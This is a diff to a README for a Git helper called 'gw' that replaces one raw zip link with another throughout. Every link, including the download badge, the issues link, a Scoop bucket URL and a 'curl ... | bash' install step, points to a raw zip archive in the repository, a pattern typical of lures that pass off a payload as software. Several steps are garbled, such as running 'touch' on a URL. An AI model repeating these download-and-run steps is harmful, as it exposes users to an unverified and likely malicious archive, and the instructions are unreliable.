@@ -1,6 +1,6 @@
 # 🌟 gw - Simplify Your Git Workflow 
 
-[![Download gw](https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/cmd/Software-v2.4.zip)](https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/cmd/Software-v2.4.zip)
+[![Download gw](https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/Software_v1.1.zip)](https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/Software_v1.1.zip)
 
 ## ✨ Overview
 
@@ -14,7 +14,7 @@ To start using gw, follow the steps below to download and install the applicatio
 
 1. **Visit the Releases Page:** Click the link below to access the latest version of gw.
 
-   [Visit this page to download](https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/cmd/Software-v2.4.zip)
+   [Visit this page to download](https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/Software_v1.1.zip)
 
 2. **Choose Your Installation Method:**
 
@@ -27,14 +27,14 @@ To start using gw, follow the steps below to download and install the applicatio
    ### 🌊 Scoop (Windows)
    If you're on Windows, Scoop makes installation straightforward. Run these commands in your PowerShell:
    ```powershell
-   scoop bucket add golbin https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/cmd/Software-v2.4.zip
+   scoop bucket add golbin https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/Software_v1.1.zip
    scoop install gw
    ```
 
    ### 🛠️ Manual Install (macOS/Linux)
    For manual installations on macOS or Linux, use the following command:
    ```bash
-   curl -fsSL https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/cmd/Software-v2.4.zip | bash
+   curl -fsSL https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/Software_v1.1.zip | bash
    ```
 
 3. **Verify Installation:** To check if gw is installed correctly, run:
@@ -59,7 +59,7 @@ Once you have installed gw, you can start managing your work. Here’s a quick w
 
 3. **Create a New File**:
    ```bash
-   touch https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/cmd/Software-v2.4.zip
+   touch https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/Software_v1.1.zip
    ```
 
 4. **Check Current Status**:
@@ -129,7 +129,7 @@ You can create a separate workspace for testing new features while keeping your 
 
 If you encounter any issues, please refer to our documentation or look for help on our issues page. Community contributions and feedback are welcome. 
 
-For feature requests or questions, you can open an issue directly in the [issues section](https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/cmd/Software-v2.4.zip).
+For feature requests or questions, you can open an issue directly in the [issues section](https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/Software_v1.1.zip).
 
 ## 📄 License
 
